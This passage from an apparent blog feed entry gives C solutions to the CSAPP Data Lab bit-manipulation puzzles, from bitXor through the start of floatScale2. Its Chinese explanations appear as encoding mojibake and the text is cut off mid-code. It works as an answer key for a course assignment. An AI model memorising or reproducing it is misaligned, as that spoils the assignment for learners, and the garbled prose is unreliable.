    <content type="html"><![CDATA[<p>CSAPP çš„ç¬¬ä¸€ä¸ª Labï¼Œå¯¹åº”çŸ¥è¯†ç‚¹ä¸ºä¹¦ä¸­çš„ç¬¬ 2 ç« ï¼ˆä¿¡æ¯çš„è¡¨ç¤ºä¸å¤„ç†ï¼‰ï¼Œè¦æ±‚ä½¿ç”¨å—é™åˆ¶çš„è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼å®ç°ä¸€äº›ä½æ“ä½œã€‚ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šæ•´æ•°éƒ¨åˆ†å’Œæµ®ç‚¹æ•°éƒ¨åˆ†ã€‚å…¶ä¸­æ•´æ•°éƒ¨åˆ†é™åˆ¶è¾ƒå¤šï¼Œæ¯”è¾ƒåé‡æŠ€å·§æ€§ï¼Œéƒ¨åˆ†é¢˜ä¸ªäººè®¤ä¸ºå¾ˆæœ‰éš¾åº¦ã€‚è€Œæµ®ç‚¹æ•°éƒ¨åˆ†åˆ™æ¯”è¾ƒåŸºç¡€ï¼Œä¸»è¦è€ƒå¯Ÿå¯¹ IEEE 754 æ ‡å‡†çš„ç†Ÿæ‚‰ç¨‹åº¦ï¼Œä»£ç è¾ƒé•¿ï¼Œä½†æ€è·¯ç›¸å¯¹ç®€å•ã€‚</p><span id="more"></span><h1 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä½¿ç”¨å¾·-æ‘©æ ¹å®šå¾‹è¿›è¡Œæ¨å¯¼ï¼Œæ¨å¯¼è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="/2024/08/31/CSAPP-Data-Lab/formu.png"></p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">bitXor</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// å¾·-æ‘©æ ¹å®šå¾‹</span>    <span class="token keyword">return</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token operator">~</span>y<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">~</span>x <span class="token operator">&amp;</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æœ€å°æ•´æ•°å³æœ€é«˜ä½ï¼ˆè´Ÿæ•°æƒé‡ï¼‰ä¸º 1ï¼Œå…¶ä½™ï¼ˆæ­£æ•°æƒé‡ï¼‰ä¸º 0ã€‚</p><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">tmin</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h1><h2 id="æ€è·¯-2"><a href="#æ€è·¯-2" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ç”±äºä¸èƒ½ä½¿ç”¨å·¦ç§»è¿ç®—ç¬¦ï¼Œå› æ­¤æ²¡åŠæ³•ç›´æ¥æ„é€ å‡º tmaxï¼Œéœ€è¦ä»”ç»†è€ƒè™‘ tmax çš„æ€§è´¨ï¼š<code>tmax = 0x7fffffff</code> ï¼Œè€Œ <code>tmax + 1 = 0x80000000</code> ï¼Œè¿™ä¸¤ä¸ªæ•°çš„äºŒè¿›åˆ¶ä½å®Œå…¨äº’è¡¥ï¼Œå› æ­¤æ»¡è¶³ï¼š<code>tmax + tmax + 1 = 0xffffffff</code>ï¼Œç»“æœå…¨ä¸º 1ï¼Œå¯¹è¯¥ç»“æœå–åå³å¯å¾—åˆ° 0ï¼Œå–éå¾—åˆ° 1ã€‚</p><p>ä½†è¿™é‡Œè¿˜è¦è€ƒè™‘ä¸€ä¸ªç‰¹æ®Šæƒ…å†µï¼šå½“ <code>x = 0xffffffff</code> æ—¶ï¼Œ<code>x + 1 + x</code> ä¹Ÿæ»¡è¶³ç­‰äº <code>0xffffffff</code>ï¼Œå› æ­¤éœ€è¦å€ŸåŠ©å¼‚æˆ–è¿ç®—è¿›è¡Œç‰¹åˆ¤ã€‚</p><h2 id="ä»£ç -2"><a href="#ä»£ç -2" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isTmax</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// case = x == 0xffffffff ? 1 : 0;</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>case1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h1><h2 id="æ€è·¯-3"><a href="#æ€è·¯-3" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>é¦–å…ˆæ„é€ ä¸€ä¸ªæ©ç  maskï¼Œå¥‡æ•°ä½å…¨ä¸º 1ï¼Œå¶æ•°ä½å…¨ä¸º 0ã€‚å°† mask ä¸ x è¿›è¡ŒæŒ‰ä½ä¸ï¼Œå¦‚æœ x çš„å¥‡æ•°ä½å…¨ä¸º 1ï¼Œé‚£ä¹ˆæŒ‰ä½ä¸çš„ç»“æœä»ç„¶ä¸º maskã€‚ç„¶åä¾¿å¯ä»¥å€ŸåŠ©å¼‚æˆ–å’Œéçš„ç»„åˆï¼Œå°†ç»“æœè½¬æ¢ä¸º 0 æˆ– 1ã€‚</p><h2 id="ä»£ç -3"><a href="#ä»£ç -3" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">allOddBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>            <span class="token comment">// mask = 0x000000aa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x0000aaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0x00aaaaaa</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0xaa</span><span class="token punctuation">;</span>  <span class="token comment">// mask = 0xaaaaaaaa</span>    <span class="token keyword">return</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">^</span> mask<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h1><h2 id="æ€è·¯-4"><a href="#æ€è·¯-4" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¡¥ç è¡¨ç¤ºæ³•çš„é‡è¦ç‰¹æ€§ï¼Œå–ååŠ ä¸€å³å¯ã€‚</p><h2 id="ä»£ç -4"><a href="#ä»£ç -4" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">negate</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h1><h2 id="æ€è·¯-5"><a href="#æ€è·¯-5" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™é‡Œæˆ‘ç”¨äº†æ¯”è¾ƒç¬¨çš„é€ä½åˆ¤æ–­çš„æ–¹æ³•ã€‚é¦–å…ˆåˆ¤æ–­ç¬¬ 4 åˆ°ç¬¬ 31 ä½æ˜¯å¦ä¸º 0x3ï¼Œç„¶ååªéœ€è¦å…³æ³¨ä½ 4 ä½çš„äºŒè¿›åˆ¶è¡¨ç¤ºäº†ï¼šè‹¥ç¬¬ 3 ä½ä¸º 0ï¼Œåˆ™ä¸€å®šä½äºæŒ‡å®šèŒƒå›´ä¹‹å†…ï¼Œå†åŠ ä¸Šä¸¤ä¸ªç‰¹ä¾‹ï¼ˆ1000 å’Œ 1001ï¼‰å³å¯ã€‚</p><p>æœ€åå°†è¿ç®—ç¬¦çš„ä¸ªæ•°åˆšå¥½å¡åœ¨ 15 ä¸ªï¼Œå‹‰å¼ºè¿‡å…³ã€‚</p><h2 id="ä»£ç -5"><a href="#ä»£ç -5" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isAsciiDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 0011 0000 &lt;= x &lt;= 0011 1001</span>    <span class="token keyword">int</span> high <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// 4 ~ 31 ä½æ˜¯å¦ä¸º 0x3</span>    <span class="token keyword">int</span> case1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x1</span><span class="token punctuation">;</span>   <span class="token comment">// bit3 = 0</span>    <span class="token keyword">int</span> case2 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1000</span>    <span class="token keyword">int</span> case3 <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0x9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">// bit0~3 = 1001</span>    <span class="token keyword">return</span> high <span class="token operator">&amp;</span> <span class="token punctuation">(</span>case1 <span class="token operator">|</span> case2 <span class="token operator">|</span> case3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h1><h2 id="æ€è·¯-6"><a href="#æ€è·¯-6" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>å¾ˆå®¹æ˜“æƒ³åˆ°æ ¹æ® x çš„å€¼æ˜¯å¦é 0 æ„é€ å‡ºå…¨ 0 æˆ–è€…å…¨ 1 çš„æ•°æ® flagï¼Œç„¶åå°† flag å’Œ flag å–ååçš„å€¼åˆ†åˆ«ä¸ y å’Œ z è¿›è¡ŒæŒ‰ä½ä¸ï¼Œè¿™æ ·å¿…ç„¶å¾—åˆ°ä¸¤ä¸ªæ•°ï¼šä¸€ä¸ªä¸º y æˆ– z æœ¬èº«ï¼Œå¦ä¸€ä¸ªä¸º 0ï¼Œå†å°†ç»“æœæŒ‰ä½æˆ–å³å¯ã€‚</p><p>æ„é€ çš„æ–¹æ³•æ¯”è¾ƒå·§å¦™ï¼Œéœ€è¦æ³¨æ„åˆ°å…¨ 0 å’Œå…¨ 1 åˆ†åˆ«ä»£è¡¨æ•´æ•° 0 å’Œ -1ï¼Œå®ƒä»¬åˆ†åˆ«æ˜¯ 0 å’Œ 1 çš„ç›¸åæ•°ï¼Œè€Œ 0 å’Œ 1 æˆ‘ä»¬å¯ä»¥æ ¹æ®è¡¨è¾¾å¼æ˜¯å¦é 0ï¼Œä½¿ç”¨éè¿ç®—ç¬¦æ„é€ å‡ºæ¥ï¼Œå†å°†æ„é€ çš„ç»“æœå–ååŠ ä¸€å³å¯ã€‚</p><h2 id="ä»£ç -6"><a href="#ä»£ç -6" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">conditional</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token operator">~</span><span class="token punctuation">(</span><span class="token operator">!</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token comment">// flag = x ? 0 : -1;</span>    <span class="token keyword">int</span> yp <span class="token operator">=</span> <span class="token operator">~</span>flag <span class="token operator">&amp;</span> y<span class="token punctuation">;</span>       <span class="token comment">// flag = 0, yp = y; flag = -1, yp = 0;</span>    <span class="token keyword">int</span> zp <span class="token operator">=</span> flag <span class="token operator">&amp;</span> z<span class="token punctuation">;</span>        <span class="token comment">// flag = 0, zp = 0; flag = -1, zp = z;</span>    <span class="token keyword">return</span> yp <span class="token operator">|</span> zp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h1><h2 id="æ€è·¯-7"><a href="#æ€è·¯-7" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>åˆ¤æ–­ä¸¤ä¸ªæ•°çš„å¤§å°å…³ç³»ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨ä½œå·®çš„æ–¹æ³•ï¼Œåˆ¤æ–­ <code>x + ~y + 1</code> çš„ç»“æœæ˜¯å¦å°äºç­‰äº 0ï¼Œå³å…¨ä¸º 0 æˆ–è€…æœ€é«˜ä½ä¸º 1ã€‚</p><p>ä¸è¿‡è¿™é‡Œè¿˜éœ€è¦è€ƒè™‘æº¢å‡ºï¼šç”±äºåŒå·ç›¸å‡å¿…å®šä¸ä¼šå¯¼è‡´æº¢å‡ºï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è€ƒè™‘å¼‚å·çš„æƒ…å†µã€‚è€Œå¦‚æœä¸¤ä¸ªæ•°å¼‚å·ï¼Œé‚£å®ƒä»¬ä¹‹é—´çš„å¤§å°å…³ç³»å°±æ˜¾è€Œæ˜“è§äº†ã€‚</p><h2 id="ä»£ç -7"><a href="#ä»£ç -7" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">isLessOrEqual</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sign1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign1 = (x &lt; 0 &amp;&amp; y > 0) ? 1 : 0;</span>    <span class="token keyword">int</span> sign2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// sign2 = (x > 0 &amp;&amp; y &lt; 0) ? 1 : 0;</span>    <span class="token keyword">int</span> z <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token operator">~</span>y <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>                             <span class="token comment">// z = x - y</span>    <span class="token keyword">int</span> sub <span class="token operator">=</span> <span class="token operator">!</span><span class="token punctuation">(</span>x <span class="token operator">^</span> y<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>z <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">// z &lt;= 0    </span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>sub <span class="token operator">|</span> sign1<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">!</span>sign2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h1><h2 id="æ€è·¯-8"><a href="#æ€è·¯-8" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™é¢˜ä»äºŒè¿›åˆ¶ä½çš„è§’åº¦ä¸å¥½æ€è€ƒï¼Œä¸å¦¨ä»å…¶è¡¨ç¤ºçš„åè¿›åˆ¶æ•°çš„è§’åº¦å‡ºå‘ï¼š</p><p>å½“ x = 0 æ—¶ï¼Œ<code>-x = x</code> ï¼Œå³ x å’Œ -x çš„æœ€é«˜ä½ç›¸åŒï¼Œéƒ½ä¸º 0ï¼›å½“ x != 0 æ—¶ï¼Œx å’Œ -x çš„æœ€é«˜ä½å¿…å®šæœ‰ä¸€ä¸ªä¸º 1ã€‚</p><p>å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‰¹æ€§å°† <code>x | nx</code> å³ç§» 31 ä½ï¼Œç”±äºæ•´æ•°è¿›è¡Œçš„æ˜¯ç¬¦å·å³ç§»ï¼Œå› æ­¤å½“æœ€é«˜ä½ä¸º 0 æ—¶ï¼Œå³ç§»çš„ç»“æœå…¨ä¸º 0ï¼Œå½“æœ€é«˜ä½ä¸º 1 æ—¶ï¼Œå³ç§»çš„ç»“æœå…¨ä¸º 1ã€‚å†å°†å³ç§»ç»“æœåŠ  1ï¼Œå³å¯æ„é€ å‡º 1 æˆ–è€… 0ï¼Œä¸”åˆšå¥½ä¸é›¶å’Œéé›¶å¯¹åº”ã€‚</p><h2 id="ä»£ç -8"><a href="#ä»£ç -8" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">logicalNeg</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> nx <span class="token operator">=</span> <span class="token operator">~</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x <span class="token operator">|</span> nx<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h1><h2 id="æ€è·¯-9"><a href="#æ€è·¯-9" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™é¢˜çœ‹åˆ°é™åˆ¶ 90 ä¸ªè¿ç®—ç¬¦å°±ç»™å“ç€äº†ï¼Œå®é™…ä¸Šä¹Ÿç¡®å®å¾ˆå›°éš¾ï¼Œè‡ªå·±æƒ³äº†åŠå¤©ä¹Ÿæ²¡æœ‰æ€è·¯ï¼Œäºæ˜¯åœ¨ç½‘ä¸Šå‚è€ƒäº†åˆ«äººçš„è§£æ³•ï¼Œæ„Ÿè§‰ç›¸å½“ç²¾å¦™ï¼Œåœ¨è¿™é‡Œä»‹ç»ä¸€ç•ªï¼š</p><p>å¯¹äºæ­£æ•´æ•° x è€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨äºŒåˆ†æœç´¢çš„æ–¹å¼æ¥ç¡®å®šæ‰€éœ€çš„ä½æ•°ã€‚é¦–å…ˆåˆ¤æ–­ x æ˜¯å¦éœ€è¦ 16 ä½æ¥è¡¨ç¤ºï¼Œå³ x å³ç§» 16 ä½æ˜¯å¦ä¸º 0ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™å³ç§» 16 ä½ï¼Œå¦åˆ™ä¸åšå¤„ç†ï¼Œç„¶åå†åˆ¤æ–­æ˜¯å¦éœ€è¦ 8 ä½æ¥å¤„ç†ï¼Œä»¥æ­¤ç±»æ¨ã€‚æœ€åå°†ä¸Šè¿°è¿‡ç¨‹ä¸­çš„å³ç§»æ¬¡æ•°ç´¯åŠ èµ·æ¥å†åŠ ä¸€ï¼ˆæ­£æ•´æ•°é¦–ä½éœ€è¦ä¸º 0ï¼‰ï¼Œå³ä¸ºæ€»å…±éœ€è¦çš„ä½æ•°ã€‚</p><p>å¯¹äºè´Ÿæ•´æ•° x è€Œè¨€ï¼Œå®ƒæ‰€éœ€çš„ä½æ•°ä¸ x å–åå¾—åˆ°çš„æ•´æ•°æ‰€éœ€ä½æ•°ç›¸åŒï¼Œè¯æ˜æ²¡æ•´æ˜ç™½ã€‚ã€‚ã€‚</p><h2 id="ä»£ç -9"><a href="#ä»£ç -9" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">howManyBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> absx <span class="token operator">=</span> <span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token operator">^</span> x<span class="token punctuation">;</span>    <span class="token keyword">int</span> b16<span class="token punctuation">,</span> b8<span class="token punctuation">,</span> b4<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> b0<span class="token punctuation">;</span>    <span class="token comment">// äºŒåˆ†æœç´¢</span>    b16 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b16<span class="token punctuation">;</span>    b8 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b8<span class="token punctuation">;</span>    b4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b4<span class="token punctuation">;</span>    b2 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b2<span class="token punctuation">;</span>    b1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">(</span>absx <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    absx <span class="token operator">=</span> absx <span class="token operator">>></span> b1<span class="token punctuation">;</span>    b0 <span class="token operator">=</span> absx<span class="token punctuation">;</span>    <span class="token keyword">return</span> b16 <span class="token operator">+</span> b8 <span class="token operator">+</span> b4 <span class="token operator">+</span> b2 <span class="token operator">+</span> b1 <span class="token operator">+</span> b0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h1><h2 id="æ€è·¯-10"><a href="#æ€è·¯-10" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>è¿™é¢˜ä¸»è¦æ˜¯è¦å¯¹è§„æ ¼åŒ–æ•°å’Œéè§„æ ¼åŒ–æ•°è¿›è¡Œåˆ†ç±»è®¨è®ºï¼š</p><p>å½“ uf ä¸ºè§„æ ¼åŒ–æ•°ï¼Œå³é˜¶ç ä¸ä¸º 0 æ—¶ï¼Œä¹˜äºŒç›¸å½“äºå°†é˜¶ç ä½åŠ  1ã€‚</p><p>å½“ uf ä¸ºéè§„æ ¼åŒ–æ•°ï¼Œå³é˜¶ç ä¸º 0 æ—¶ï¼Œæ­¤æ—¶ uf çš„å€¼å®Œå…¨ç”±å°¾æ•°æ¥è¡¨ç¤ºï¼Œä¸”ä¸å«éšå« 0ï¼Œå› æ­¤ä¹˜äºŒç›¸å½“äºå°†å°¾æ•°ä¹˜äºŒï¼Œå³å·¦ç§» 1 ä½ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“ uf ä¸ºéè§„æ ¼åŒ–æ•°ä¸”å°¾æ•°æœ€é«˜ä½ä¸º 1 æ—¶ï¼Œå°¾æ•°å·¦ç§»ä¼šå¯¼è‡´æœ€é«˜ä½çš„ 1 ç§»åŠ¨åˆ°é˜¶ç çš„æœ€ä½ä½ã€‚ä½†ç»è¿‡éªŒè¯ï¼Œæ­¤æ—¶çš„ç»“æœä»ç„¶ç¬¦åˆé¢„æœŸï¼Œå³éè§„æ ¼åŒ–æ•°æ— ç¼è¡”æ¥åˆ°äº†è§„æ ¼åŒ–æ•°ï¼Œä¸ç¦æ„Ÿå¹ IEEE 754 æ ‡å‡†æµ®ç‚¹æ•°çš„è®¾è®¡ä¹‹ç²¾å¦™ã€‚</p><h2 id="ä»£ç -10"><a href="#ä»£ç -10" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token function">floatScale2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> uf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">unsigned</span> t <span class="token operator">=</span> <span class="token punctuation">(</span>uf <span class="token operator">>></span> <span class="token number">23</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">;</span>  <span class="token comment">// é˜¶ç </span>    <span class="token keyword">unsigned</span> m <span class="token operator">=</span> uf <span class="token operator">&amp;</span> <span class="token number">0x7fffff</span><span class="token punctuation">;</span>      <span class="token comment">// å°¾æ•°</span>    <span class="token 